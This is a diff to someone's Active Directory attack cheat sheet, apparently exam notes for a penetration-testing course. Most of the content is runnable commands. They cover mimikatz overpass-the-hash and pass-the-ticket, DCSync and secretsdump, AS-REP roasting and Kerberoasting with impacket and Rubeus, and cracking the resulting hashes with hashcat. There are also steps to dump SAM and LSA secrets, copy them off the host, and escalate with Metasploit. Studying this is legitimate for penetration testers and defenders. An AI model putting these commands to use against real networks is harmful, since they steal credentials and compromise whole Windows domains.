@@ -218,32 +218,79 @@ mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com
 psexec.exe \\dc1 cmd.exe
 ```
 
+### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
+```bash
+#output is a kerberos ticket
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
+# Checking if the forged tickets is in memory
+ps> klist
+
+#get shell
+psexec.exe -accepteula \\<remote_hostname> cmd  
+```
+
 ## DCSync Attack
 - The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
 ```
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
-## AS-REP Roasting Attack - not require Pre-Authentication
-- kerbrute - Enumeration Users
+## Targeted AS-REP roasting
+
+### on Kali
+- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
+- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
+- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting, then **obtain their password** thru AS-REP hashes
+- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
+
+kerbrute - Enumeration Users
 ```
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
 ```
 https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
 
-- GetNPUsers.py - Query ASReproastable accounts from the KDC
+GetNPUsers.py - Query/find ASReproastable accounts from the KDC
 ```
 impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ```
+or
+```
+impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1
+```
 
-## Kerberoast
+Get plaintext password of user who "Do not require Kerberos preauthentication" using hashcat with option 18200 for AS-REP
+```
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
+```
+
+## on windows (use Rubeus)
+```powershell
+#extract AS-REP hash
+.\Rubeus.exe asreproast /nowrap
+
+#copy to kali to run hash cat
+sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+
+## Kerberoast (https://github.com/skelsec/kerberoast)
 - impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
 ```
 or  
 ```
+GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
+```
+or
+```
 impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
+```
+or
+```
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
 ```
 
 ```
@@ -256,18 +303,6 @@ or
 ```
 runas /user:<hostname>\<user> cmd.exe
 ```
-
-`Kerberoasting`
-
-         Invoke-Kerberoast in powerview  
-         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
-         https://github.com/skelsec/kerberoast
-         GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
-
-
-
-
-
      
 
 # Tools Introduction
@@ -369,17 +404,7 @@ sudo bloodhound
 
 
 
-### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
-```bash
-#output is a kerberos ticket
-mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 
-# Checking if the forged tickets is in memory
-ps> klist
-
-#get shell
-psexec.exe -accepteula \\<remote_hostname> cmd  
-```
 
 ## EvilWinRM (install before exam, do a snapshot before installing)
 - Gives persistent shell. Crackmapexec doesnt.
@@ -571,30 +596,7 @@ python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 - then crack the hash using hashcat to get the clear password
 - after attack, REMEMBER to delete the SPN
 
-### AS-REP roasting
-- Find user account with user account option "Do not require Kerberos preauthentication" ENABLED, then obtain their password thru AS-REP hashes
-#### on Kali
-```bash
-# [KALI] find users (not user1) who "Do not require Kerberos preauthentication"
-impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1
 
-# [KALI] hashcat with option 18200 for AS-REP, to obtain the plaintext password of user who "Do not require Kerberos preauthentication"
-sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
-```
-#### on windows (use Rubeus)
-```bash
-#extract AS-REP hash
-.\Rubeus.exe asreproast /nowrap
-
-#copy to kali to run hash cat
-sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-```
-
-### Targeted AS-REP roasting
-- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
-- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
-- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
-- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
 
 ### DCSync-Domain Controller Synchronization
 - Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
@@ -634,20 +636,20 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 2. for each vulnerabilities suggested, run metasploit payload to obtain Reverse shell: `use exploit/windows/local/ms10_015_kitrap0d`
 3. repeat thru the listed of suggested exploits and try until success
 
-# Crack SAM (NTLM hash) and SYSTEM
-1. On Windows, run hfs.exe to transfer SAM and SYSTEM to Kali (drag and drop)
-2. On Kali, `wget http://192.168.1.55/sam` and `wget http://192.168.1.55/system`
-3. Use samdump2 to decrypt SAM. `samdump2 system sam`
-4. Copy and paste the hashes from (3) to notepad: `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
-5. Note: -m specifies the hash type to decrypt e.g. 1000 = NTLM
-
-# Dump SAM (NTLM) and LSA using mimikatz
+## Dump SAM (NTLM) and LSA using mimikatz
 1. needs to be admin to run mimikatz
 2. `powershell -ep bypass`
 3. `import-module .\invoke-mimikatz.ps1`
 4. `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'`
 
-**# 80. pass the hash using mimikatz
+## Crack SAM (NTLM hash) and SYSTEM
+1. On Windows, run hfs.exe to transfer SAM and SYSTEM to Kali (drag and drop)
+2. On Kali, `wget http://192.168.1.55/sam` and `wget http://192.168.1.55/system`
+3. Use samdump2 to decrypt SAM. `samdump2 system sam`
+4. Copy and paste the hashes from (3) to notepad: `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
+5. Note: -m specifies the hash type to decrypt e.g. 1000 = NTLM
+   
+## pass the hash using mimikatz
 1. `powershell -ep bypass`
 2. import-module .\invoke-mimikatz.ps1`
 3. `Invoke-Mimikatz -Command '"sekurlsa::pth /user:stdent5 /domain:pentesting/ntlm:369def79d8372408bf6e93364cc93075 /run:powershell.exe"'`
@@ -655,12 +657,12 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 5. Note for PTH, hash is valid only until the user change the password -> use RC4, while pass the ticket is only valid for a few hours.
 6. Note: Kerberos is using AES256**
 
-**### Pass the ticket 1
+## Pass the ticket 1
 1. `.\mimikatz.exe` or `import-module .\invoke-mimikatz.ps1`
 2. Export .kirbi file (with latest timestamp) to the working directory folder: `export Kirsekurlsa::tickets /export` or `Invoke-Mimikatz -Command '"Mimikatz::debug" "sekurlsa::tickets /export" "exit"'`
 3. Finds the newly exported file int he working directory folder: `dir *.kirbi`
 4. Pass the ticket: `mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*` or `invoke-mimikatz -Command '"Mimikatz::debug "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"'
 5. To list and show all the tickets that you have: `klist`**
 
-### Pass the ticket 2
+## Pass the ticket 2
 1. Use Rubeus instead of mimikatz
